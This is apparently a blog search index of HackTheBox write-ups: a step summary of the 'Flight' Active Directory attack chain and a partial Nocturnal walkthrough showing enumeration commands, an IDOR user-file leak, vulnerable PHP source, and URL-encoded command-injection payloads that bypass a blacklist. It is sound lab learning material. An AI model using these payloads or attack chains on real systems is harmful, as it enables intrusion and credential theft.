information gathered, it was found to be vulnerable <code>RFI</code></li> <li>Exploiting <code>RFI</code> leaked the NTLM hash of a user (svc_apache)</li> <li>Cracked the NTLM hash, got password for user (svc_apache)</li> <li>Correlated the found creds with SMB, LDAP, RPC services</li> <li>Enumerated <code>SMB</code> as this user (svc_apache), found valid users</li> <li>Enumerated <code>LDAP</code> as this user (svc_apache) but nothing interesting was found</li> </ol>"},{"location":"ch3ckm8_HTB_Flight/#foothold_1","title":"Foothold","text":"<ol> <li><code>Password spraying</code> via <code>SMB</code> was performed, found valid creds for another user (S.Moon)</li> <li>Correlated the found creds with SMB, LDAP, RPC services</li> <li>Enumerated <code>SMB</code> as this user (S.Moon), found WRITE permissions to a share</li> <li>Found exploit and by uploading it to the share leaked the NTLM hash of another user (C.Bum) </li> <li>Cracked the NTLM hash, got password for user (C.Bum) </li> <li>Correlated the found creds with SMB, LDAP, RPC services</li> <li>Enumerated <code>SMB</code> as this user (C.Bum), found WRITE permissions to a share, the exact same share that the vhost page's content was stored</li> <li>Found exploit and by uploading it to the share, and triggering it by navigating it to the webpage, we got rev shell as a user (svc_apache)</li> <li>Impersonated user C.Bum as svc_apache, via running a new process as another user (RunAs, since we know the creds of C.Bum, and created a new cmd process run as C.Bum to send a rev shell back to our machine</li> <li>Got rev shell back to our machine, as user C.Bum</li> <li>got user flag</li> </ol>"},{"location":"ch3ckm8_HTB_Flight/#privesc_1","title":"Privesc","text":"<ol> <li>Enumerated files and directories , and found the existence of IIS server</li> <li>Uploaded winPEAS to find privesc paths, focused on the listening ports</li> <li>Correlated listening ports with the IIS server, found the corresponding port</li> <li>Port forwarded the port to attacker host, then inspected the webpage</li> <li>Enumerated the files of the IIS server, and found that user C.Bum has <code>WRITE</code> permissions there</li> <li>Uploaded an aspx rev shell, and got shell as iis apppool\\defaultapppool</li> <li>Privileges of this user revealed the existence of <code>SeImpersonate</code> Privilege, which in this case (iis apppool user) can impersonate the machine account</li> <li>Grabbed machine account's ticket</li> <li>Used the ticket to authenticate and perform DCSync, which reavealed the <code>NTLM</code> hash of Administrator</li> <li>Logged in as Administrator via pass the hash and grabbed the root flag</li> </ol>"},{"location":"ch3ckm8_HTB_Flight/#sidenotes","title":"Sidenotes","text":"<p>One of the best, most enjoyable and most important machines i have done so far. This was my first contact with virtual hosts, and also featured a multitude of different methods along with the exploitation of the both webapps. Privesc also almost had everything from port forwarding to user impersonation and DCSync. </p> <p>What i also will remember from this one, is the enumeration for <code>virtual hosts</code>, and also that one user can <code>impersonate another user via running a new process</code> as the other user, if he knows the creds for the other user. </p> <p>To sum up, this machine almost had everything, and i will definetely revisit it often throughout my OSCP journey.</p> <p></p>"},{"location":"ch3ckm8_HTB_Nocturnal/","title":"Nocturnal","text":""},{"location":"ch3ckm8_HTB_Nocturnal/#intro","title":"Intro","text":"<p>This is an \"easy\" linux machine from HackTheBox, lets dive in.  </p> <p>No Machine Information/description was provided.</p> <p>[[linux]] [[commandinjection]] [[codereview]] [[PortForwarding]] Tags: #linux #commandinjection #codereview #PortForwarding Tools used: ffuf (webapp's users enumeration) BurpSuite (web requests modification) Hashcat (hash cracking) wget (file transfers)</p>"},{"location":"ch3ckm8_HTB_Nocturnal/#reconnaissance","title":"Reconnaissance","text":"<p>add machine to hosts <pre><code>echo '10.10.11.64 nocturnal.htb' | sudo tee -a /etc/hosts\n</code></pre></p> <p>lets start our nmap scan: <pre><code>nmap nocturnal.htb -sV -Pn -T4\n</code></pre> output: <pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 16:38 EDT\nNmap scan report for nocturnal.htb (10.10.11.64)\nHost is up (0.047s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.56 seconds\n</code></pre></p> <p>What we see here is pretty straightforward, only 2 ports open, one for the ssh service, and one for the http</p> <p>Since we have no info yet about any user, we will start with the http service.</p>"},{"location":"ch3ckm8_HTB_Nocturnal/#directory-and-subdomain-enumeration","title":"Directory and subdomain enumeration","text":"<p>Lets do a directory enumeration using gobuster, to find as much information as possible about the web service. <pre><code>gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u nocturnal.htb\n</code></pre> output: <pre><code>\u2500# gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u nocturnal.htb\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://nocturnal.htb\n[+] Method:                  GET\n[+] Threads:                 50\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\nhttp://nocturnal.htb/index.php            (Status: 200) [Size: 1524]\nhttp://nocturnal.htb/login.php            (Status: 200) [Size: 644]\nhttp://nocturnal.htb/register.php         (Status: 200) [Size: 649]\nhttp://nocturnal.htb/view.php             (Status: 302) [Size: 2919] [--&gt; login.php]\nhttp://nocturnal.htb/uploads              (Status: 403) [Size: 162]\nhttp://nocturnal.htb/uploads.txt          (Status: 403) [Size: 162]\nhttp://nocturnal.htb/uploads.html         (Status: 403) [Size: 162]\nhttp://nocturnal.htb/admin.php            (Status: 302) [Size: 0] [--&gt; login.php]\nhttp://nocturnal.htb/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]\nhttp://nocturnal.htb/dashboard.php        (Status: 302) [Size: 0] [--&gt; login.php]\nhttp://nocturnal.htb/backups              (Status: 301) [Size: 178] [--&gt; http://nocturnal.htb/backups/]\nhttp://nocturnal.htb/uploads2.html        (Status: 403) [Size: 162]\nhttp://nocturnal.htb/uploads2             (Status: 403) [Size: 162]\nhttp://nocturnal.htb/uploads2.txt         (Status: 403) [Size: 162]\nProgress: 882240 / 882244 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre> perfect, it appears that there are not much pages to explore.</p> <p>Now we can search also for subdomains too: <pre><code>gobuster dns -d nocturnal.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50\n</code></pre> output <pre><code>===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Domain:     nocturnal.htb\n[+] Threads:    50\n[+] Timeout:    1s\n[+] Wordlist:   /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nStarting gobuster in DNS enumeration mode\n===============================================================\nProgress: 220560 / 220561 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre> so no subdomains were found, lets move on</p> <p>Browsing to the web app, we landed on this homepage: </p> <p>First, lets register a new user (ch3ckm8) and then login.</p> <p>On both login and register pages i tried performing <code>sql injection</code> but was not successful, so i moved on.</p> <p>Then i uploaded a new file (be aware of the valid file extensions)  which can be seen there, lets try downloading it.</p> <p>If we hover over the file , in this case the file i uploaded <code>accounts.xlsx</code>, shows the download link in the bottom of the page:  The url looks like this: <pre><code>http://nocturnal.htb/view.php?username=ch3ckm8&amp;file=accounts.xlsx\n</code></pre></p> <p>This is an interesting observation and could be a way to enumerate the users of this website.</p>"},{"location":"ch3ckm8_HTB_Nocturnal/#foothold","title":"Foothold","text":""},{"location":"ch3ckm8_HTB_Nocturnal/#user-enumeration","title":"User enumeration","text":"<p>For the fuzzing, we need 3 things: - target url containing parameter for the usernames - our current phpsessionid (cookie) -  wordlist for usernames</p> <ol> <li> <p>From earlier, we have the target url: <code>http://nocturnal.htb/view.php?username=ch3ckm8&amp;file=accounts.xlsx</code></p> </li> <li> <p>Use burp to grab your phpsessid, in order to perform user enumeration (via interception of the request) </p> </li> <li> <p>For the wordlist, i used this one from SecLists: https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt and used <code>FUZZ</code> keyword on the ffuf command to enumerate users, on the file i specified a random filename and the filename wont matter for the fuzzing process:</p> </li> </ol> <pre><code>ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&amp;file=sth.xlsx' -w /root/Downloads/names.txt -H 'Cookie: PHPSESSID=ucd01moit7qaem6bddb8bm1a8n' -fs 2985\n</code></pre> <p>output</p> <pre><code>        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://nocturnal.htb/view.php?username=FUZZ&amp;file=accounts.xlsx\n :: Wordlist         : FUZZ: /root/Downloads/names.txt\n :: Header           : Cookie: PHPSESSID=ucd01moit7qaem6bddb8bm1a8n\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 2985\n________________________________________________\n\nadmin                [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 47ms]\namanda               [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 51ms]\ntobias               [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 50ms]\n:: Progress: [10177/10177] :: Job [1/1] :: 851 req/sec :: Duration: [0:00:12] :: Errors: 0 ::\n</code></pre> <p>great! it found 3 users!: <pre><code>admin\namanda\ntobias\n</code></pre></p> <p>Perfect! since we know have all the available users.</p> <p>Since the dashboard.php's request does not require the pass of the user, we can just use burp for every user to reach their dashboard page, and view their uploaded files.</p> <p>So, try to click your uploaded file as the user you created (ch3ckm8), and interecept the request with burp, in order to modify it and then forwarding the request.</p> <p>Disclaimer: the file in the request can be anything, even a non existing filename in the request wont stop the page from showing all the uploaded files of a user.  to each of the users we have, lets start with tobias:  Hm, no luck with tobias, i tried admin too and no files uploaded for this user.....</p> <p>now lets try user amanda similarly,  </p> <p>it appears there she has a file uploaded! </p> <p>Lets first download the <code>.odt</code> file and view its contents: <pre><code>Dear Amanda,\nNocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.\nThe file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.\nRemember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.\n\nYours sincerely,\nNocturnal's IT team\n</code></pre></p> <p>inside this text, we found plaintext pass for user amanda, the updated creds now are: <pre><code>amanda\narHkG7HAI68X8s1J\n</code></pre></p> <p>We can now proceed on logging in as amanda, then we see sth interesting here: </p> <p>it seems that amanda has access to the admin panel, and thats convenient, since we cant access the admin panel as admin.</p> <p>We can go to the admin panel by clicking on the admin panel button on the same page, we come accross this page :</p> <p><code>admin.php</code>  i had some interesting observations here, first there are both php files, and folders (backups, uploads), and secondly we can enter input via text (backup password) to create a backup.</p> <p>Then lets enter a password of our preference, create a backup, download it, to view some of the files:  so, upon reading the files above, i noticed the following about the files and folders: - uploads -&gt; contains the uploaded files  - logout.php -&gt; just logs out the user, nothing further valuable - style.css -&gt; the style of the page, no comments or anything else observed - index.php -&gt; the homepage, nothing further interesting - register.php</p> <pre><code>&lt;?php\nsession_start();\n$db = new SQLite3('../nocturnal_database/nocturnal_database.db');\n\nif ($_SERVER['REQUEST_METHOD'] == 'POST') {\n    $username = $_POST['username'];\n    $password = md5($_POST['password']);\n\n    $stmt = $db-&gt;prepare(\"INSERT INTO users (username, password) VALUES (:username, :password)\");\n    $stmt-&gt;bindValue(':username', $username, SQLITE3_TEXT);\n    $stmt-&gt;bindValue(':password', $password, SQLITE3_TEXT);\n\n    if ($stmt-&gt;execute()) {\n        $_SESSION['success'] = 'User registered successfully!';\n        header('Location: login.php');\n        exit();\n    } else {\n        $error = 'Failed to register user.';\n    }\n}\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Register&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"style.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div class=\"container\"&gt;\n        &lt;h1&gt;Register&lt;/h1&gt;\n        &lt;?php if (isset($error)): ?&gt;\n            &lt;p class=\"error\"&gt;&lt;?php echo $error; ?&gt;&lt;/p&gt;\n        &lt;?php endif; ?&gt;\n        &lt;form method=\"post\"&gt;\n            &lt;input type=\"text\" name=\"username\" placeholder=\"Username\" required&gt;\n            &lt;input type=\"password\" name=\"password\" placeholder=\"Password\" required&gt;\n            &lt;button type=\"submit\"&gt;Register&lt;/button&gt;\n        &lt;/form&gt;\n        &lt;a href=\"login.php\"&gt;Already have an account? Login here&lt;/a&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <ul> <li>login.php</li> </ul> <pre><code>&lt;?php\nsession_start();\n$db = new SQLite3('../nocturnal_database/nocturnal_database.db');\n\nif ($_SERVER['REQUEST_METHOD'] == 'POST') {\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n\n    $stmt = $db-&gt;prepare(\"SELECT * FROM users WHERE username = :username\");\n    $stmt-&gt;bindValue(':username', $username, SQLITE3_TEXT);\n    $result = $stmt-&gt;execute()-&gt;fetchArray();\n\n    if ($result &amp;&amp; md5($password) === $result['password']) {\n        $_SESSION['user_id'] = $result['id'];\n        $_SESSION['username'] = $username;\n        header('Location: dashboard.php');\n        exit();\n    } else {\n        $error = 'Invalid username or password.';\n    }\n}\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Login&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"style.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div class=\"container\"&gt;\n        &lt;h1&gt;Login&lt;/h1&gt;\n        &lt;?php if (isset($error)): ?&gt;\n            &lt;p class=\"error\"&gt;&lt;?php echo $error; ?&gt;&lt;/p&gt;\n        &lt;?php endif; ?&gt;\n        &lt;form method=\"post\"&gt;\n            &lt;input type=\"text\" name=\"username\" placeholder=\"Username\" required&gt;\n            &lt;input type=\"password\" name=\"password\" placeholder=\"Password\" required&gt;\n            &lt;button type=\"submit\"&gt;Login&lt;/button&gt;\n        &lt;/form&gt;\n        &lt;a href=\"register.php\"&gt;Don't have an account? Register here&lt;/a&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <ul> <li>dashboard.php  </li> </ul> <pre><code>&lt;?php\nsession_start();\nif (!isset($_SESSION['user_id'])) {\n    header('Location: login.php');\n    exit();\n}\n\n$db = new SQLite3('../nocturnal_database/nocturnal_database.db');\n$user_id = $_SESSION['user_id'];\n$username = $_SESSION['username'];\n\n// Handle file upload\nif ($_SERVER['REQUEST_METHOD'] == 'POST') {\n    $target_dir = \"uploads/\";\n    $file_name = basename($_FILES[\"fileToUpload\"][\"name\"]);\n    $target_file = $target_dir . $file_name;\n    $file_type = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));\n\n    $allowed_types = array(\"pdf\", \"doc\", \"docx\", \"xls\", \"xlsx\", \"odt\");\n\n    if (in_array($file_type, $allowed_types)) {\n        if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) {\n            $stmt = $db-&gt;prepare(\"INSERT INTO uploads (user_id, file_name) VALUES (:user_id, :file_name)\");\n            $stmt-&gt;bindValue(':user_id', $user_id, SQLITE3_INTEGER);\n            $stmt-&gt;bindValue(':file_name', $file_name, SQLITE3_TEXT);\n            $stmt-&gt;execute();\n        } else {\n            echo \"Error uploading file.\";\n        }\n    } else {\n        echo \"Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.\";\n    }\n}\n\n// Get user's uploaded files\n$stmt = $db-&gt;prepare(\"SELECT * FROM uploads WHERE user_id = :user_id\");\n$stmt-&gt;bindValue(':user_id', $user_id, SQLITE3_INTEGER);\n$files = $stmt-&gt;execute();\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Dashboard&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"style.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div class=\"container\"&gt;\n        &lt;?php if ($username === 'admin' || $username === 'amanda'): ?&gt;\n            &lt;p&gt;&lt;a href=\"/admin.php\"&gt;Go to Admin Panel&lt;/a&gt;&lt;/p&gt;\n        &lt;?php endif; ?&gt;\n         &lt;h1&gt;Welcome, &lt;?php echo htmlspecialchars($username); ?&gt;&lt;/h1&gt;\n\n        &lt;h2&gt;Upload File&lt;/h2&gt;\n        &lt;form action=\"\" method=\"post\" enctype=\"multipart/form-data\"&gt;\n            &lt;input type=\"file\" name=\"fileToUpload\" required&gt;\n            &lt;button type=\"submit\"&gt;Upload File&lt;/button&gt;\n        &lt;/form&gt;\n\n        &lt;h2&gt;Your Files&lt;/h2&gt;\n        &lt;ul&gt;\n            &lt;?php while ($row = $files-&gt;fetchArray()): ?&gt;\n                &lt;li&gt;\n                    &lt;a href=\"view.php?username=&lt;?php echo urlencode($username); ?&gt;&amp;file=&lt;?php echo urlencode($row['file_name']); ?&gt;\"&gt;\n                        &lt;?php echo htmlspecialchars($row['file_name']); ?&gt;\n                    &lt;/a&gt;\n                    &lt;span&gt;(Uploaded on &lt;?php echo $row['upload_time']; ?&gt;)&lt;/span&gt;\n                &lt;/li&gt;\n            &lt;?php endwhile; ?&gt;\n        &lt;/ul&gt;\n\n        &lt;a href=\"logout.php\" class=\"logout\"&gt;Logout&lt;/a&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <ul> <li>view.php -&gt; when you download the file</li> </ul> <pre><code>&lt;?php ob_start(); ?&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;View File&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;div class=\"container\"&gt;\n    &lt;h1&gt;File Viewer&lt;/h1&gt;\n\n    &lt;?php\n    session_start();\n\n    if (!isset($_SESSION['user_id'])) {\n        header('Location: login.php');\n        exit();\n    }\n\n    $db = new SQLite3('../nocturnal_database/nocturnal_database.db');\n\n    $username = $_GET['username'];\n    $file = basename($_GET['file']);\n\n    $allowed_extensions = [\"pdf\", \"doc\", \"docx\", \"xls\", \"xlsx\", \"odt\"];\n    $file_extension = pathinfo($file, PATHINFO_EXTENSION);\n\n    if (!in_array($file_extension, $allowed_extensions)) {\n        echo \"&lt;div class='error'&gt;Invalid file extension.&lt;/div&gt;\";\n        exit();\n    }\n\n    $stmt = $db-&gt;prepare('SELECT id FROM users WHERE username = :username');\n    $stmt-&gt;bindValue(':username', $username, SQLITE3_TEXT);\n    $result = $stmt-&gt;execute();\n\n    if ($row = $result-&gt;fetchArray()) {\n        $user_id = $row['id'];\n\n        $stmt = $db-&gt;prepare('SELECT * FROM uploads WHERE user_id = :user_id AND file_name = :file');\n        $stmt-&gt;bindValue(':user_id', $user_id, SQLITE3_INTEGER);\n        $stmt-&gt;bindValue(':file', $file, SQLITE3_TEXT);\n        $result = $stmt-&gt;execute();\n\n        if ($row = $result-&gt;fetchArray()) {\n            $file_path = 'uploads/' . $file;\n\n            if (file_exists($file_path)) {\n                ob_clean();\n                header('Content-Type: application/octet-stream');\n                header('Content-Disposition: attachment; filename=\"' . basename($file_path) . '\"');\n                readfile($file_path);\n                exit();\n            } else {\n                echo \"&lt;div class='error'&gt;File not found on the server.&lt;/div&gt;\";\n                showAvailableFiles($user_id, $db);\n            }\n        } else {\n            echo \"&lt;div class='error'&gt;File does not exist.&lt;/div&gt;\";\n            showAvailableFiles($user_id, $db);\n        }\n    } else {\n        echo \"&lt;div class='error'&gt;User not found.&lt;/div&gt;\";\n    }\n\n    function showAvailableFiles($user_id, $db) {\n        $stmt = $db-&gt;prepare('SELECT file_name FROM uploads WHERE user_id = :user_id');\n        $stmt-&gt;bindValue(':user_id', $user_id, SQLITE3_INTEGER);\n        $result = $stmt-&gt;execute();\n\n        echo \"&lt;h2&gt;Available files for download:&lt;/h2&gt;\";\n        echo \"&lt;ul&gt;\";\n\n        while ($row = $result-&gt;fetchArray()) {\n            $file_name = $row['file_name'];\n            echo '&lt;li&gt;&lt;a href=\"view.php?username=' . urlencode($_GET['username']) . '&amp;file=' . urlencode($file_name) . '\"&gt;' . htmlspecialchars($file_name) . '&lt;/a&gt;&lt;/li&gt;';\n        }\n\n        echo \"&lt;/ul&gt;\";\n    }\n    ?&gt;\n\n&lt;/div&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <ul> <li>admin.php This page will be our target, as wee see a text box there, indicating that we can specify password to encrypt our backup, lets inspect its code too, to see if we can find how it works under the hood: </li> </ul> <p><pre><code>&lt;?php\nsession_start();\n\nif (!isset($_SESSION['user_id']) || ($_SESSION['username'] !== 'admin' &amp;&amp; $_SESSION['username'] !== 'amanda')) {\n    header('Location: login.php');\n    exit();\n}\n\nfunction sanitizeFilePath($filePath) {\n    return basename($filePath); // Only gets the base name of the file\n}\n\n// List only PHP files in a directory\nfunction listPhpFiles($dir) {\n    $files = array_diff(scandir($dir), ['.', '..']);\n    echo \"&lt;ul class='file-list'&gt;\";\n    foreach ($files as $file) {\n        $sanitizedFile = sanitizeFilePath($file);\n        if (is_dir($dir . '/' . $sanitizedFile)) {\n            // Recursively call to list files inside directories\n            echo \"&lt;li class='folder'&gt;\ud83d\udcc1 &lt;strong&gt;\" . htmlspecialchars($sanitizedFile) . \"&lt;/strong&gt;\";\n            echo \"&lt;ul&gt;\";\n            listPhpFiles($dir . '/' . $sanitizedFile);\n            echo \"&lt;/ul&gt;&lt;/li&gt;\";\n        } else if (pathinfo($sanitizedFile, PATHINFO_EXTENSION) === 'php') {\n            // Show only PHP files\n            echo \"&lt;li class='file'&gt;\ud83d\udcc4 &lt;a href='admin.php?view=\" . urlencode($sanitizedFile) . \"'&gt;\" . htmlspecialchars($sanitizedFile) . \"&lt;/a&gt;&lt;/li&gt;\";\n        }\n    }\n    echo \"&lt;/ul&gt;\";\n}\n\n// View the content of the PHP file if the 'view' option is passed\nif (isset($_GET['view'])) {\n    $file = sanitizeFilePath($_GET['view']);\n    $filePath = __DIR__ . '/' . $file;\n    if (file_exists($filePath) &amp;&amp; pathinfo($filePath, PATHINFO_EXTENSION) === 'php') {\n        $content = htmlspecialchars(file_get_contents($filePath));\n    } else {\n        $content = \"File not found or invalid path.\";\n    }\n}\n\nfunction cleanEntry($entry) {\n    $blacklist_chars = [';', '&amp;', '|', '$', ' ', '`', '{', '}', '&amp;&amp;'];\n\n    foreach ($blacklist_chars as $char) {\n        if (strpos($entry, $char) !== false) {\n            return false; // Malicious input detected\n        }\n    }\n\n    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');\n}\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Admin Panel&lt;/title&gt;\n    &lt;link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&amp;display=swap\" rel=\"stylesheet\"&gt;\n\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div class=\"container\"&gt;\n        &lt;h1&gt;Admin Panel&lt;/h1&gt;\n\n        &lt;h2&gt;File Structure (PHP Files Only)&lt;/h2&gt;\n        &lt;?php listPhpFiles(__DIR__); ?&gt;\n\n        &lt;h2&gt;View File Content&lt;/h2&gt;\n        &lt;?php if (isset($content)) { ?&gt;\n            &lt;pre&gt;&lt;?php echo $content; ?&gt;&lt;/pre&gt;\n        &lt;?php } ?&gt;\n\n        &lt;h2&gt;Create Backup&lt;/h2&gt;\n        &lt;form method=\"POST\"&gt;\n            &lt;label for=\"password\"&gt;Enter Password to Protect Backup:&lt;/label&gt;\n            &lt;input type=\"password\" name=\"password\" required placeholder=\"Enter backup password\"&gt;\n            &lt;button type=\"submit\" name=\"backup\"&gt;Create Backup&lt;/button&gt;\n        &lt;/form&gt;\n\n        &lt;div class=\"backup-output\"&gt;\n\n&lt;?php\nif (isset($_POST['backup']) &amp;&amp; !empty($_POST['password'])) {\n    $password = cleanEntry($_POST['password']);\n    $backupFile = \"backups/backup_\" . date('Y-m-d') . \".zip\";\n\n    if ($password === false) {\n        echo \"&lt;div class='error-message'&gt;Error: Try another password.&lt;/div&gt;\";\n    } else {\n        $logFile = '/tmp/backup_' . uniqid() . '.log';\n\n        $command = \"zip -x './backups/*' -r -P \" . $password . \" \" . $backupFile . \" .  &gt; \" . $logFile . \" 2&gt;&amp;1 &amp;\";\n\n        $descriptor_spec = [\n            0 =&gt; [\"pipe\", \"r\"], // stdin\n            1 =&gt; [\"file\", $logFile, \"w\"], // stdout\n            2 =&gt; [\"file\", $logFile, \"w\"], // stderr\n        ];\n\n        $process = proc_open($command, $descriptor_spec, $pipes);\n        if (is_resource($process)) {\n            proc_close($process);\n        }\n\n        sleep(2);\n\n        $logContents = file_get_contents($logFile);\n        if (strpos($logContents, 'zip error') === false) {\n            echo \"&lt;div class='backup-success'&gt;\";\n            echo \"&lt;p&gt;Backup created successfully.&lt;/p&gt;\";\n            echo \"&lt;a href='\" . htmlspecialchars($backupFile) . \"' class='download-button' download&gt;Download Backup&lt;/a&gt;\";\n            echo \"&lt;h3&gt;Output:&lt;/h3&gt;&lt;pre&gt;\" . htmlspecialchars($logContents) . \"&lt;/pre&gt;\";\n            echo \"&lt;/div&gt;\";\n        } else {\n            echo \"&lt;div class='error-message'&gt;Error creating the backup.&lt;/div&gt;\";\n        }\n\n        unlink($logFile);\n    }\n}\n?&gt;\n\n    &lt;/div&gt;\n\n        &lt;?php if (isset($backupMessage)) { ?&gt;\n            &lt;div class=\"message\"&gt;&lt;?php echo $backupMessage; ?&gt;&lt;/div&gt;\n        &lt;?php } ?&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> Whats interesting here, is the part where our input is parsed:</p> <pre><code>$command = \"zip -x './backups/*' -r -P \" . $password . \" \" . $backupFile . \" .  &gt; \" . $logFile . \" 2&gt;&amp;1 &amp;\";\n</code></pre>"},{"location":"ch3ckm8_HTB_Nocturnal/#why-it-works","title":"Why it works:","text":"<ul> <li>it concatenates user input (<code>$password</code>) into a shell command without proper escaping or sanitization.</li> <li>Their is an attempt to filter certain characters (<code>;</code>, <code>&amp;</code>, <code>|</code>, etc.) in <code>cleanEntry()</code>, but this blacklist approach is incomplete and can be bypassed using URL encoding, null bytes, tabs, newlines, or command substitution.</li> </ul>"},{"location":"ch3ckm8_HTB_Nocturnal/#why-also-cleanentry-is-not-enough","title":"Why also <code>cleanEntry()</code> is not enough:","text":"<p><pre><code>function cleanEntry($entry) {\n    $blacklist_chars = [';', '&amp;', '|', '$', ' ', '', '{', '}', '&amp;&amp;'];\n\n    foreach ($blacklist_chars as $char) {\n        if (strpos($entry, $char) !== false) {\n            return false; // Malicious input detected\n        }\n    }\n\n    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');\n}\n</code></pre> - This function only checks for a limited set of characters using <code>strpos()</code>, which:     - Does not catch characters like tabs (<code>\\t</code>), newlines (<code>\\n</code>), or URL-encoded input.     - Can be bypassed with payloads that do not use the exact characters in your blacklist. Bottom line Blacklisting is never a reliable way to sanitize shell arguments.</p>"},{"location":"ch3ckm8_HTB_Nocturnal/#command-injection-testing","title":"Command injection: testing","text":"<p>by trial and error, i concluded in this command injection type using url encoding: <code>%09</code> -&gt; tab (because %20 for space did not work) <code>%OA</code> -&gt; newline</p> <p>below some examples of command injection being possible: <pre><code>%0Abash%09-c%09\"whoami\"%0A\n</code></pre> <pre><code>%0Abash%09-c%09\"dir\"%0A\n</code></pre> </p> <p>So we know command injection EXISTS, lets now find a php rev shell in order to upload it, i found this one: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php and specified my ip and port for the rev shell. (no other changes needed on this rev shell)</p> <p>BUT For some reason, pasting my input directly on the \"enter password\" form,  only executed one-word command injections like  the ones above and did not execute any more complex ones no matter which url encoding i used. </p> <p>So i thought that maybe sth wrong is going on, and i wanted to see the requests and responses in detail. thus i tried using 